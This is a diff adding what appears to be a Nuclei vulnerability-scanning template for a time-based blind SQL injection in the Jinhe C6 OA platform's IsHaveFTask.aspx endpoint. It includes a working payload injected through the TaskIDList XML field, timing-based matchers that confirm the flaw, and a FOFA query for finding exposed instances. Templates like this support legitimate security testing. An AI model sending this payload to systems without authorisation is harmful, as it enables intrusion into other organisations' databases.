@@ -1,0 +1,38 @@
+id: jh-c6-isHaveFTask-sqli
+
+info:
+  name: 金和C6协同管理平台IsHaveFTask.aspx SQL注入漏洞
+  author: onewin
+  severity: high
+  description: |
+    金和C6协同管理平台IsHaveFTask.aspx接口存在时间盲注漏洞，攻击者可通过TaskIDList参数执行SQL命令
+    [漏洞发现时间：2025年7月]
+  metadata:
+    fofa-query: body="JC6金和协同管理平台"
+  tags: 金和网络-金和OA
+
+http:
+  - raw:
+      - |
+        POST /c6/Jhsoft.Web.dailytaskmanage/IsHaveFTask.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+
+        <root>
+          <Task>
+            <TaskIDList>1);WAITFOR DELAY '0:0:3'--</TaskIDList>
+          </Task>
+        </root>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration>=3 && duration<8"
+      - type: word
+        part: body
+        words:
+          - "0"
